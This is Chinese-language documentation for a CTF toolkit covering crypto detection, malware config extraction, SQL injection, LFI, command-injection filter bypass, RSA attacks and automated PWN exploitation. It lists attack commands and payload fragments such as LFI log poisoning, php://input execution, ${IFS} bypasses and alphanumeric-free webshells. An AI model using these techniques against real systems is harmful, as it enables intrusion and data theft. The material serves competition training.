## 1. Crypto Finder — 二进制密码算法识别工具

**文件路径**: `Reverse/tools/crypto_finder.py`
**依赖**: `capstone`, `lief`, `pyelftools`（可选，增强分析）
**支持格式**: ELF (x86/x64/ARM/ARM64/MIPS), PE (x86/x64), Mach-O, Raw binary
**版本**: 1.1

### 功能概述

快速识别二进制文件中使用的密码算法和密钥位置。五层检测：
1. **常量签名扫描** — 44 个签名覆盖 23 种算法（AES/DES/RC4/TEA/MD5/SHA/SM3/SM4 等）
2. **Capstone 反汇编分析** — 交叉引用定位、循环模式识别（RC4 KSA / XOR 循环）
3. **密钥位置启发式定位** — 常量邻近/交叉引用/结构推断三重策略
4. **IDAPython 脚本生成** — 自动在 IDA 中标注算法常量和密钥候选
5. **自定义编码表检测** — 识别魔改 Base64 编码表（CTF 逆向高频考点），自动区分标准表/URL-safe/自定义表

### 用法示例

```bash
# 基本分析（自动执行全部四层检测）
python3 crypto_finder.py ./challenge.bin

# JSON 格式输出（便于脚本处理）
python3 crypto_finder.py ./challenge.bin --json -o result.json

# 生成 IDAPython 标注脚本（在 IDA 中 File → Script file 运行）
python3 crypto_finder.py ./challenge.bin --ida-script cf_annotate.py

# 快速模式：仅常量扫描，跳过反汇编（大文件快速筛查）
python3 crypto_finder.py ./challenge.bin --no-disasm

# 同时搜索 ASCII 密钥字符串（靠近密码常量的可打印字符串）
python3 crypto_finder.py ./challenge.bin --scan-ascii

# 详细输出（含交叉引用和数据 dump）
python3 crypto_finder.py ./challenge.bin --verbose

# 列出所有支持的算法签名
python3 crypto_finder.py --list-algos
```

### 参数说明

| 参数 | 说明 |
|------|------|
| `binary` | 目标二进制文件路径 |
| `--json` | 以 JSON 格式输出结果 |
| `-o, --output` | 输出文件路径（JSON 或文本） |
| `--ida-script PATH` | 生成 IDAPython 标注脚本到指定路径 |
| `--no-disasm` | 跳过反汇编分析（快速模式） |
| `--scan-ascii` | 搜索 ASCII 密钥字符串 |
| `--verbose, -v` | 详细输出 |
| `--list-algos` | 列出所有支持的算法签名 |

### 典型使用场景

- **逆向题初步分析**：拿到二进制后首先跑一遍，快速定位加密算法类型
- **PE x64 逆向题**：全面支持 PE x64 反汇编，可检测 XOR 加密循环、自定义 Base64 表等常见考点
- **魔改 Base64 识别**：自动扫描 64 字节连续可打印 ASCII，与标准表比对差异，快速发现自定义 Base64 编码表
- **配合 IDA 深入分析**：生成 IDAPython 脚本，在 IDA 中自动标注常量和密钥
- **批量筛查**：用 `--no-disasm` 快速模式批量检测多个文件（仍支持 Base64 表检测，不依赖反汇编）

## 2. 控制软件配置提取器 — 二进制配置/密钥自动提取

**文件路径**: `Reverse/tools/config_extractor.py`  
**依赖**: `capstone`（智能密钥定位），`pycryptodome`（AES 解密，可选）  
**支持格式**: ELF (x86/x64), PE (x86/x64), Raw binary

### 功能概述

面向 CTF 应急响应/逆向方向，从二进制样本中自动提取通信配置信息（IP、端口、任务标识等）。采用"智能优先 + 暴力降级"策略：

1. **Phase 1 — 明文扫描**：直接搜索 IP/端口/URL/域名/任务标识
2. **Phase 1.5 — CS Beacon 专用检测**：Cobalt Strike Beacon 配置块识别（XOR 爆破 + TLV 解析，支持魔改版）
3. **Phase 2 — 智能密钥定位**：Capstone 反汇编 → RC4 KSA 识别 → lea 引用追踪 → 精确提取密钥
4. **Phase 3 — 密钥派生检测**：识别 RC4(zero_buffer, key) → derived_key 模式
5. **Phase 4 — 智能密钥解密**：用提取的密钥尝试 RC4/XOR/AES 解密
6. **Phase 5 — 暴力穷举降级**：智能模式无结果时自动启用，扫描所有可打印字符串作为候选密钥

### 用法示例

```bash
# 自动分析（智能 + 暴力，推荐首次使用）
python3 config_extractor.py sample.elf

# 详细输出（查看每个阶段的扫描过程）
python3 config_extractor.py sample.elf --verbose

# 仅智能模式（快速，适合大文件初筛）
python3 config_extractor.py sample.elf --smart-only

# 手动指定 RC4 密钥（已知密钥时跳过搜索）
python3 config_extractor.py sample.elf --rc4-key 6b6579

# PE 文件分析
python3 config_extractor.py sample.exe --verbose
```

### 参数说明

| 参数 | 说明 |
|------|------|
| `file` | 二进制样本文件路径 |
| `--verbose, -v` | 详细输出模式 |
| `--rc4-key` | 手动指定 RC4 密钥（hex 格式） |
| `--smart-only` | 仅使用智能密钥定位，跳过暴力穷举 |

### 典型使用场景

- **应急响应题**：给定恶意样本二进制，需要提取 C2 服务器地址、端口、通信密钥
- **逆向题**：二进制中包含加密配置，需要自动定位密钥并解密
- **CS Beacon 分析**：检测和解析 Cobalt Strike Beacon 配置（含魔改版偏移适配）

## 3. DeFlower — 花指令自动清除脚本

**文件路径**: `Reverse/tools/deflower.py`  
**运行环境**: IDA Pro 7.x / 9.0+（IDAPython 脚本）  
**支持架构**: x86 / x64

### 功能概述

CTF 逆向题中自动检测并清除花指令（干扰反汇编的垃圾代码），恢复 IDA Pro 的正确反汇编结果。支持 11 条检测规则，覆盖 CTF 真实题目中的主流花指令类型：

| 规则 | 说明 | 典型形式 |
|------|------|---------|
| junk_jmp | 垃圾跳转 | `EB 00`（jmp 到下一条） |
| opp_jcc_pair | 相反条件跳转对 | `jz A; jnz A`（永真） |
| alt_jcc | 交替条件跳转 | `jcc A; jmp B; A: <垃圾>` |
| push_pop_same | push+pop 同寄存器 | `push rax; pop rax` |
| math_identity | 数学恒等变换 | `sub rax,5; add rax,5` |
| call_pop_eip | call+pop 获取 EIP | `call $+5; pop reg` |
| opaque_predicate | 不透明谓词 | `xor eax,eax; test eax,eax; jz` |
| jcc_offset | 偏移跳转+垃圾字节 | `jz label+1; jnz label+1; db 0xE8` |
| jmp_over_junk | jmp 跳过垃圾字节 | `jmp skip; db 0xE8,0xED...` |
| stc_clc_jcc | 标志位操控 | `stc; jnb target`（永假） |
| call_add_esp | call+add esp 平衡栈 | `call label; label: add esp,4` |

### 使用方法

1. 在 IDA Pro 中打开目标二进制文件
2. 通过 `File → Script file` 加载 `deflower.py`
3. 脚本自动检测扫描范围（选中区域 > 当前函数 > 第一个代码段）
4. 多轮迭代扫描（默认 5 轮），每轮前强制重新分析
5. 清除完成后，在函数入口按 `P` 重建函数，按 `F5` 重新生成伪代码

### 注意事项

- 所有修改仅在 IDA 内存中生效，不修改磁盘文件
- 建议运行前备份 `.i64` / `.idb` 文件
- 可通过修改 `RULES_ENABLED` 字典单独启用/禁用特定规则
- 可通过修改 `DEFAULT_ITERATIONS` 调整迭代次数

## 4. angr 符号执行求解器

**文件路径**: `Reverse/tools/angr_solve.py`  
**依赖**: `angr`, `claripy`  
**使用场景**: angr_ctf 题目集（渐进式三题）

### 功能概述

三道循序渐进的 angr 符号执行解题实例，覆盖 angr 核心技术：

| 题目 | 难度 | 核心技术 | 知识点 |
|------|------|---------|--------|
| 00_angr_find | 入门 | find/avoid 目标地址搜索 | `entry_state()`, `explore(find=, avoid=)` |
| 08_angr_constraints | 中级 | SimProcedure Hook 规避路径爆炸 | `SimProcedure`, `claripy.If()`, 路径爆炸原理 |
| 09_angr_hooks | 中级 | 多轮输入 + SimProcedure | `is_successful`/`should_abort` 回调 |

### 用法示例

```bash
# 运行全部三题（base_dir 需替换为 angr_ctf 题目目录）
python3 angr_solve.py

# 或在脚本中修改 base_dir 路径后运行
```

### 核心知识点

- **entry_state()**：从程序入口点创建初始状态，angr 自动处理 scanf 的符号输入
- **explore(find=, avoid=)**：引导符号执行器搜索/避开特定地址
- **SimProcedure**：函数级 Hook 机制，替换复杂函数为等价符号表达式，避免路径爆炸
- **claripy.If(cond, true, false)**：符号条件表达式，让 Z3 求解器直接处理等式
- **路径爆炸**：循环内的逐字符条件判断导致状态指数级增长

### 扩展指南

将脚本适配到新题目的步骤：
1. 用 `objdump` 或 IDA 找到"成功"和"失败"分支的地址
2. 设置 `find=` 和 `avoid=` 参数
3. 如有逐字符比较函数导致路径爆炸，用 `SimProcedure` Hook 替换
4. 多轮输入场景用 `is_successful`/`should_abort` 回调判断

## 5. SQL 注入工具包

**文件路径**: `Web/tools/web_sqli_toolkit.py`  
**依赖**: `requests`  
**核心功能**: 布尔盲注、UNION 回显注入、时间盲注、自动检测注入点

### 功能概述

四种注入模式，覆盖 CTF Web 题中常见的 SQL 注入场景：

1. **布尔盲注（Boolean Blind）** — 二分法逐字符提取数据，多线程并发加速
2. **UNION 回显注入** — 自动判断列数（ORDER BY 递增检测）+ 回显列定位
3. **时间盲注（Time-Based Blind）** — 基于响应延迟判断，`IF(condition, SLEEP(5), 0)` 模式
4. **自动检测** — 自动探测注入点，识别注入类型，选择最优策略

### 用法示例

```bash
# 布尔盲注（指定注入参数和标记）
python3 web_sqli_toolkit.py --url "http://target/index.php?id=1" \
  --mode boolean --param id \
  --true-mark "Welcome" --false-mark "Not Found"

# UNION 回显注入（自动判断列数和回显位置）
python3 web_sqli_toolkit.py --url "http://target/index.php?id=1" \
  --mode union --param id

# 时间盲注（基于延迟判断）
python3 web_sqli_toolkit.py --url "http://target/index.php?id=1" \
  --mode time --param id --delay 3

# 自动检测模式
python3 web_sqli_toolkit.py --url "http://target/index.php?id=1" \
  --mode auto --param id

# 提取指定数据
python3 web_sqli_toolkit.py --url "http://target/index.php?id=1" \
  --mode boolean --param id --true-mark "Welcome" \
  --extract-db --extract-tables --extract-flag
```

### 参数说明

| 参数 | 说明 |
|------|------|
| `--url` | 目标 URL（注入参数用 ?param=value 形式） |
| `--mode` | 注入模式：boolean / union / time / auto |
| `--param` | 注入参数名 |
| `--true-mark` | 布尔盲注：页面存在时出现的特征字符串 |
| `--false-mark` | 布尔盲注：页面不存在时出现的特征字符串 |
| `--delay` | 时间盲注：判断延迟阈值（秒） |
| `--extract-db` | 提取数据库名 |
| `--extract-tables` | 提取表名 |
| `--extract-flag` | 提取 flag（自动搜索包含 flag/ctf 的字段） |

### 典型使用场景

- **有回显差异的注入点**：用布尔盲注模式，设置 true/false 标记
- **有直接回显位的注入点**：用 UNION 模式，自动判断列数和回显位
- **无回显无差异的注入点**：用时间盲注模式，基于响应时间判断

## 7. LFI 检测利用工具

**文件路径**: `Web/tools/web_lfi_toolkit.py`  
**依赖**: `requests`  
**核心功能**: 文件包含漏洞检测、绕过、利用

### 功能概述

本地文件包含（LFI）漏洞全流程工具：

1. **检测** — 发送常见敏感文件路径（`/etc/passwd`、`C:\Windows\win.ini`），判断是否存在 LFI
2. **绕过** — 当基本检测被过滤时，自动尝试多种绕过技术：
   - 路径遍历（`../` 序列）
   - 双重编码（`%252e%252e%252f`）
   - 空字节截断（`%00`）
   - HTTP/HTTPS 协议封装
3. **利用** — 三种利用方式：
   - 敏感文件读取（预置常见敏感路径列表）
   - PHP 伪协议利用（`php://filter`、`php://input`、`data://`）
   - 日志投毒（向 Apache/Nginx 日志注入 PHP 代码，通过 LFI 执行）

### 用法示例

```bash
# 自动检测
python3 web_lfi_toolkit.py --url "http://target/index.php?page=about" \
  --param page

# 读取指定文件
python3 web_lfi_toolkit.py --url "http://target/index.php?page=about" \
  --param page --read /etc/passwd

# PHP 伪协议利用（读取源码）
python3 web_lfi_toolkit.py --url "http://target/index.php?page=about" \
  --param page --pseudo-filter index.php

# 日志投毒获取 RCE
python3 web_lfi_toolkit.py --url "http://target/index.php?page=about" \
  --param page --log-poison /var/log/nginx/access.log

# 交互式文件读取
python3 web_lfi_toolkit.py --url "http://target/index.php?page=about" \
  --param page --shell
```

### 参数说明

| 参数 | 说明 |
|------|------|
| `--url` | 目标 URL |
| `--param` | 注入参数名 |
| `--read` | 读取指定文件路径 |
| `--pseudo-filter` | 使用 `php://filter` 读取指定 PHP 文件源码 |
| `--pseudo-input` | 使用 `php://input` 执行 PHP 代码 |
| `--log-poison` | 日志投毒，指定日志文件路径 |
| `--shell` | 交互式文件读取模式 |

## 9. 命令执行绕过生成器

**文件路径**: `Web/tools/web_rce_bypass.py`  
**依赖**: 无（纯 Python 标准库）  
**核心功能**: 命令执行关键字/空格/路径/编码绕过，无字母数字 Webshell 生成

### 功能概述

CTF Web 题中命令执行（RCE）漏洞的绕过 payload 生成器，四种绕过类型：

1. **关键字绕过** — 当 `cat`、`flag`、`ls` 等命令/文件名被过滤时：
   - 变量拼接（`c=ca;${c}t /flag`）
   - 空变量拼接（`ca$@t`、`ca${IFS}t`）
   - 引号拼接（`ca""t`、`ca''t`）
   - 反斜杠拼接（`ca\t`）
   - 通配符（`/f*`、`/fla?`）

2. **空格绕过** — 当空格被过滤时：
   - `${IFS}`（Internal Field Separator）
   - `$IFS$9`
   - `<` 重定向（`cat<flag`）
   - `{cat,/flag}` 大括号扩展
   - `%09`（Tab 编码）

3. **路径绕过** — 当 `/` 或路径关键字被过滤时：
   - 编码绕过（八进制、十六进制）
   - 环境变量构造（`${PATH:0:1}` 取 `/`）
   - 通配符匹配

4. **无字母数字 Webshell** — 当所有字母和数字均被过滤时：
   - 自增构造：`$_=[];$_=@$_;$_=++$_;...`（通过数组元素自增构造字母）
   - 异或构造：通过字符异或运算生成任意字母
   - 临时文件利用：`?><?=.` 配合 `\` 生成临时文件名执行命令

### 用法示例

```bash
# 关键字绕过（cat 和 flag 被过滤）
python3 web_rce_bypass.py --type keyword --keyword cat --file /flag

# 空格绕过
python3 web_rce_bypass.py --type space --cmd "cat /flag"

# 路径绕过（/ 被过滤）
python3 web_rce_bypass.py --type path --path /flag

# 无字母数字 Webshell（全过滤场景）
python3 web_rce_bypass.py --type noalnum --cmd "cat /flag"

# 组合绕过（自动生成多种 payload 供测试）
python3 web_rce_bypass.py --type all --cmd "cat /flag"
```

### 参数说明

| 参数 | 说明 |
|------|------|
| `--type` | 绕过类型：keyword / space / path / noalnum / all |
| `--keyword` | 需要绕过的关键字（keyword 模式） |
| `--cmd` | 目标命令（space/noalnum/all 模式） |
| `--file` | 目标文件路径 |
| `--path` | 需要绕过过滤的路径 |

### 典型使用场景

- **简单关键字过滤**：题目过滤 `cat`、`flag` 等关键字，用变量拼接或通配符绕过
- **空格过滤**：`${IFS}` 是最常用的空格替代方案
- **全面过滤**：无字母数字模式应对极端过滤场景

## 12. RSA 工具包

**文件路径**: `Crypto/06-rsa-basic/rsa_toolkit.py`  
**依赖**: `gmpy2`（高精度运算加速）, `pycryptodome`（RSA 加解密）, `sympy`（因式分解）  
**核心功能**: RSA 基础运算、因式分解、常见攻击

### 功能概述

以库形式（`import rsa_toolkit`）提供 RSA 全流程操作，涵盖 CTF 密码学题常见考点：

**基础运算**：
- `gmpy2` 加速的大数运算（模幂、逆元、gcd），内置纯 Python 回退
- 快速模逆（`invert(a, n)`）、扩展欧几里得（`egcd(a, b)`）

**因式分解**：
- Trial Division（试除法）
- Pollard's p-1 分解
- Fermat 分解（适合 p、q 接近的情况）
- Fermat 数筛
- 在线 factordb 查询（自动化）

**攻击模式**（4 种）：
- **小公钥指数攻击**（Low Public Exponent）— `e` 很小（如 `e=3`）且明文短，直接开 `e` 次方根
- **共模攻击**（Common Modulus）— 同一 `n`、不同 `e1,e2`（`gcd(e1,e2)=1`），利用扩展欧几里得求 `a,b` 使得 `a*e1 + b*e2 = 1`，再 `m = c1^a * c2^b mod n`
- **Wiener 攻击** — `d` 很小（`d < n^0.25 / 3`），基于连分数展开求解
- **pq 直接解密** — 已知 `p, q, e, c`，计算 `d = invert(e, (p-1)*(q-1))`，解密 `m = pow(c, d, n)`

### 用法示例

```python
from rsa_toolkit import factor, attack, RSAUtils

# 1. 小公钥指数攻击
plaintext = attack.low_exponent_attack(e=3, n=..., c=...)

# 2. 共模攻击
plaintext = attack.common_modulus_attack(
    n=..., e1=..., c1=..., e2=..., c2=...
)

# 3. Wiener 攻击
result = attack.wiener_attack(e=..., n=...)
# result = (d, p, q) 或 None

# 4. 已知 p, q 直接解密
plaintext = attack.decrypt_with_pq(p=..., q=..., e=..., c=...)

# 5. 因式分解
# Fermat 分解（p、q 接近）
p, q = factor.fermat(n=...)

# Pollard p-1
p = factor.pollard_p1(n=..., B=100000)

# 在线 factordb 查询
result = factor.factordb(n=...)

# 6. 基础运算
d = RSAUtils.invert(e, phi)  # 模逆
g = RSAUtils.gcd(a, b)       # 最大公约数
m = pow(c, d, n)             # 标准解密
```

### 典型使用场景

- **`e=3` 小指数**：明文未填充且较短 → 小公钥指数攻击，直接开立方
- **同一 n 不同 e**：拿到两组 `(e1, c1)` 和 `(e2, c2)` → 共模攻击
- **`d` 偏小**：`e` 很大或 `n` 结构特殊 → Wiener 攻击
- **`n` 可分解**：Fermat（p≈q）或 factordb 在线查询
- **已知 p 和 q**：直接构造私钥解密

## 13. PWN 通用利用工具

**文件路径**: `PWN/pwn-arcanum/pwn_arcanum.py`  
**依赖**: `pwntools`  
**核心功能**: 二进制静态分析 + 自动化漏洞利用（ret2text/ret2shellcode/ret2syscall/ret2csu/ret2libc/canary_leak/fmt_string_leak）

### 功能概述

PWN 竞赛自动化利用框架（v1.10，4625行），两阶段工作流：

**阶段一：静态分析**（pwntools ELF 解析）：
- 自动提取二进制安全特性（NX/PIE/Canary/RELRO）
- 识别危险函数（`system`, `execve`, `/bin/sh` 字符串）
- 解析 PLT/GOT 表
- 检测栈溢出缓冲区大小（通过 `overflow` 函数自动探测）
- 分析 ROP gadget 可用性
- 检测格式化字符串漏洞（`printf(buf)` 模式）

**阶段二：自动利用**（8 种策略，自动选择）：

| 策略 | 适用条件 | 核心原理 |
|------|---------|--------|
| ret2text | 存在后门函数或 `system("/bin/sh")` | 覆盖返回地址跳到后门函数 |
| ret2shellcode | NX 关闭且有可写可执行区域 | 在缓冲区写入 shellcode 并跳转执行 |
| ret2syscall | NX 开启但存在 `int 0x80` gadget | 用 ROP 链构造 `execve("/bin/sh", 0, 0)` |
| ret2csu | 无 pop rdi，但有 `__libc_csu_init` gadget | 用 CSU gadget 控制 rdi 泄漏 libc → libc pop rdi |
| ret2libc | NX 开启，无后门，有 pop rdi | 泄漏 libc 地址 → 计算 system 偏移 → 二次利用 |
| canary_leak | Canary + 格式化字符串漏洞 | 通过 `%N$p` 泄露 canary → 构造溢出 |
| fmt_string_leak | 无 pop rdi + printf(buf) | 格式化字符串泄露 libc → 从 libc 中获取 gadget |

- v1.10 核心改动：ret2libc stage2 后立即发送 flag 读取命令解决非交互 shell 问题；新增 `--cmd` 参数自定义发送命令；DASCTF ret2lib 解题成功验证
- v1.9 关键修复：泄露地址包含 0x0a 字节时不再截断；自动检测输入提示字符串
- 内置 x86/x64/ARM 多架构 shellcode
- 远程利用优先（`remote`），本地调试兼容（`process`）
- 支持自定义偏移量和 libc 版本
- 支持 libc.rip 在线查询 libc 版本
- 支持 `--local` 模式自动用 socat 启动本地测试

### 用法示例

```bash
# 自动分析 + 自动利用（远程）
python3 pwn_arcanum.py binary ./challenge --remote 127.0.0.1:9999

# 仅静态分析（查看二进制特性）
python3 pwn_arcanum.py binary ./challenge --analyze-only

# 指定利用策略
python3 pwn_arcanum.py binary ./challenge \
  --remote 127.0.0.1:9999 --strategy ret2libc

# 指定 libc（ret2libc 模式）
python3 pwn_arcanum.py binary ./challenge \
  --remote 127.0.0.1:9999 --libc libc.so.6

# 本地调试模式
python3 pwn_arcanum.py binary ./challenge --local
```

### 参数说明

| 参数 | 说明 |
|------|------|
| `binary` | 目标二进制文件路径 |
| `--remote` | 远程地址（host:port 格式） |
| `--local` | 本地调试模式 |
| `--analyze-only` | 仅执行静态分析 |
| `--strategy` | 指定利用策略：ret2text/ret2shellcode/ret2syscall/ret2csu/ret2libc/canary_leak |
| `--libc` | 指定 libc 文件路径（ret2libc/ret2csu/fmt_string_leak 模式） |
| `--offset` | 手动指定溢出偏移量 |
| `--cmd` | 自定义 shell 获取后发送的命令（如 `cat /flag`） |

### 典型使用场景

- **入门 PWN 题**：有后门函数 → ret2text 策略直接跳转
- **NX 关闭**：可写可执行区域 → ret2shellcode 策略
- **NX 开启无后门**：需要 ROP → ret2syscall 或 ret2libc
- **Canary 保护**：有格式化字符串漏洞 → canary_leak 策略泄露 canary
- **无 pop rdi**：有 printf(buf) 漏洞 → fmt_string_leak 策略泄露 libc
- **比赛速刷**：`--analyze-only` 快速获取二进制特性，手动判断策略
